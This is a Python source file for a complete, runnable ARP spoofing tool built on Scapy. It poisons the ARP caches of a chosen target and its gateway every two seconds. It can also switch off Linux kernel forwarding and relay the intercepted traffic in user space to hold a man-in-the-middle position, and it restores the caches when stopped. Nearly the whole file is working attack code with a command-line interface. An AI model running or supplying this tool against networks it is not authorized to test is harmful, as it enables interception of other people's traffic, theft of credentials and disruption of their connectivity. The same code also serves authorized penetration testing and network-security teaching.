# *********************************************************
#
# Description: Implementation of an ARP spoofer tool with User-Space forwarding and CLI arguments.
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

import argparse
import ipaddress
import os
import sys
import platform
import threading
import time
from scapy.all import ARP, Ether, sendp, arping, conf, get_if_hwaddr, get_if_addr, sniff, IP

# --- Constants ---

BANNER_LENGTH = 60
RESTORE_PACKET_COUNT = 5
SPOOF_INTERVAL_SECONDS = 2

stop_event = threading.Event()


# --- Globals ---

# Global variables to store original Linux kernel state
g_orig_ip_forward = None
g_orig_send_redirects = None


# --- Functions ---

def user_space_forwarder(interface, local_mac, local_ip, target_ip, target_mac, gateway_ip, gateway_mac):
    """Asynchronous user-space L3 routing to replace host kernel IP Forwarding"""

    def process_packet(pkt):
        if (True == pkt.haslayer(IP) and True == pkt.haslayer(Ether)):
            # Intercept packets destined to our MAC, but meant for a different IP
            if (local_mac == pkt[Ether].dst and local_ip != pkt[IP].dst):

                # Delete checksums to force Scapy to dynamically recalculate them
                del pkt[IP].chksum
                if (True == pkt.haslayer("TCP")):
                    del pkt["TCP"].chksum
                elif (True == pkt.haslayer("UDP")):
                    del pkt["UDP"].chksum

                # Route from Target -> Gateway
                if (target_ip == pkt[IP].src):
                    pkt[Ether].src = local_mac
                    pkt[Ether].dst = gateway_mac
                    pkt[IP].ttl -= 1
                    sendp(pkt, iface=interface, verbose=False)

                # Route from Gateway -> Target
                elif (gateway_ip == pkt[IP].src):
                    pkt[Ether].src = local_mac
                    pkt[Ether].dst = target_mac
                    pkt[IP].ttl -= 1
                    sendp(pkt, iface=interface, verbose=False)

    # Use strict BPF filter to minimize CPU overhead on the sniffing thread
    bpf_filter = f"ip and (host {target_ip} or host {gateway_ip})"
    sniff(iface=interface, filter=bpf_filter, prn=process_packet, store=False,
          stop_filter=lambda x: stop_event.is_set())


# ====================================================

def arp_spoof(target_ip, gateway_ip, interface, ip_forward):
    """Spoofer main execution flow"""

    print_banner(" INFO ")

    routing_info = conf.route.route(target_ip)
    if (None == interface):
        interface = routing_info[0]

    if (None == gateway_ip or "0.0.0.0" == gateway_ip):
        default_route_info = conf.route.route("0.0.0.0")
        gateway_ip = default_route_info[2]

    local_mac = get_if_hwaddr(interface)
    local_ip = get_if_addr(interface)
    target_mac = get_target_mac(target_ip, interface)
    gateway_mac = get_target_mac(gateway_ip, interface)

    print_banner(" Network Information ")
    print(f"\nTarget IP:   {target_ip}\nTarget MAC:  {target_mac}\n"
          f"Gateway IP:  {gateway_ip}\nGateway MAC: {gateway_mac}\n"
          f"Interface:   {interface}\nLocal MAC:   {local_mac}\n"
          f"Ip Forward:  {ip_forward}")

    if (True == ip_forward):
        suppress_kernel_routing()
        
        print("\n[*] Starting User-Space IP Forwarding thread...")
        forward_thread = threading.Thread(target=user_space_forwarder,
                                          args=(interface, local_mac, local_ip, target_ip, target_mac, gateway_ip,
                                                gateway_mac))
        forward_thread.daemon = True
        forward_thread.start()

    print_banner(" Attack Active (Press Ctrl+C to stop) ")
    sent_packets = 0

    try:
        while True:
            send_arp_reply(target_ip, target_mac, gateway_ip, local_mac, interface)
            send_arp_reply(gateway_ip, gateway_mac, target_ip, local_mac, interface)

            sent_packets += 2
            print(f"\r[*] Packets sent: {sent_packets}", end="", flush=True)
            time.sleep(SPOOF_INTERVAL_SECONDS)

    except KeyboardInterrupt:
        print("\n\n[!] Interrupt signal received. Initiating teardown...")
        stop_event.set()
        restore_network(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        if (True == ip_forward):
            restore_kernel_routing()
        print_banner(" Teardown Completed ")


# ====================================================

def send_arp_reply(target_ip, target_mac, spoofed_ip, spoofed_mac, interface):
    """Craft and send a single ARP Reply packet at Layer 2"""
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
    ether = Ether(dst=target_mac, src=spoofed_mac)
    sendp(ether / arp, iface=interface, verbose=False)


# ====================================================

def restore_network(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """Restore genuine ARP tables on both ends to prevent DoS"""
    print("[*] Restoring ARP cache tables for target and gateway...")

    for _ in range(RESTORE_PACKET_COUNT):
        send_arp_reply(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        send_arp_reply(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        time.sleep(0.2)

    print("[+] Genuine ARP mapping restored successfully.")


# ====================================================

def get_target_mac(ip_address, interface):
    """Resolve MAC address using an active ARP ping"""
    print(f"[*] Sending ARP Request to {ip_address} via {interface}...")
    answered, _ = arping(ip_address, iface=interface, verbose=False)

    if (0 < len(answered)):
        mac = answered[0][1].hwsrc
        print(f"[+] Found MAC: {mac}")
        return mac
    else:
        print(f"[-] Node {ip_address} unreachable at Layer 2.")
        sys.exit(1)


# ====================================================

def suppress_kernel_routing():
    """Conditionally suppress Linux kernel routing to prevent race conditions"""
    global g_orig_ip_forward, g_orig_send_redirects

    if ("Linux" == platform.system()):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                g_orig_ip_forward = f.read().strip()
            with open("/proc/sys/net/ipv4/conf/all/send_redirects", "r") as f:
                g_orig_send_redirects = f.read().strip()

            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0\n")
            with open("/proc/sys/net/ipv4/conf/all/send_redirects", "w") as f:
                f.write("0\n")
            
            print("[*] Linux kernel routing temporarily suppressed.")
        except IOError:
            print("[!] Warning: Could not suppress kernel routing. Race conditions may occur.")
            

# ====================================================

def restore_kernel_routing():
    """Restore original Linux kernel routing state"""
    global g_orig_ip_forward, g_orig_send_redirects

    if ("Linux" == platform.system() and None != g_orig_ip_forward and None != g_orig_send_redirects):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(g_orig_ip_forward + "\n")
            with open("/proc/sys/net/ipv4/conf/all/send_redirects", "w") as f:
                f.write(g_orig_send_redirects + "\n")
            
            print("[+] Original Linux kernel routing state restored.")
        except IOError as e:
            print(f"[-] Failed to restore kernel routing: {e}")


# ====================================================

def print_banner(input_str):
    """Print standard formatted banner"""
    if (None == input_str or "" == input_str):
        print("\n" + "=" * BANNER_LENGTH)
    else:
        print("\n" + input_str.center(BANNER_LENGTH, "="))


# --- Main Execution ---

def main():
    """Parse CLI arguments, check permissions, and run"""
    if (0 != os.geteuid()):
        print("\nError: Script must be run as root (UID 0).")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="ARP Spoofer with OS-agnostic User-Space Forwarding")
    parser.add_argument("-t", "--target", required=True, help="Target IPv4 address")
    parser.add_argument("-g", "--gateway", default=None, help="Gateway IPv4 address (Default: auto-resolve)")
    parser.add_argument("-i", "--interface", default=None, help="Network interface (Default: auto-resolve)")
    parser.add_argument("-f", "--forward", action="store_true", help="Enable user-space IP forwarding (MiTM mode)")

    args = parser.parse_args()

    try:
        ipaddress.IPv4Address(args.target)
        if (None != args.gateway):
            ipaddress.IPv4Address(args.gateway)
    except ValueError:
        print("\nError: Invalid IPv4 address format provided.")
        sys.exit(1)

    arp_spoof(args.target, args.gateway, args.interface, args.forward)


if ('__main__' == __name__):
    main()
